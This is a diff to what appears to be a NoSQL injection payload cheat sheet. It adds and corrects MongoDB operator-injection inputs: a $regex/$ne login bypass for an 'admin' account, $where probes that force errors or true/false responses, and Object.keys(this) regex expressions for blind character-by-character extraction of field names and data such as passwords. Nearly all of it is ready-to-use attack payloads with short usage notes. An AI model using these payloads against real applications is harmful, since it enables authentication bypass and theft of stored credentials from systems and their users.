@@ -11,12 +11,14 @@
 #Operator Injection To Retrieving Unknown Data
 
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
-{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"1"}}
-{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^{0}.*')"}}
-{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^{0}0.*')"}}
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"} >> To generate an server error.
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"} >> To generate a false statement.
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"1"}} >> To generate a true statement.
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}.*')"}}
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}0.*')"}}
 
-Object.keys(this)[0].match('^{0}.*') >> To identify data size. Ex: Password
-Object.keys(this)[0].match('^{0}0.*') >> To fetch the data
+Object.keys(this)[0].match('^.{0}.*') >> To identify data size. Ex: Password
+Object.keys(this)[0].match('^.{0}0.*') >> To fetch the data
 
 1st 0 means key number
 2nd 0 means data size
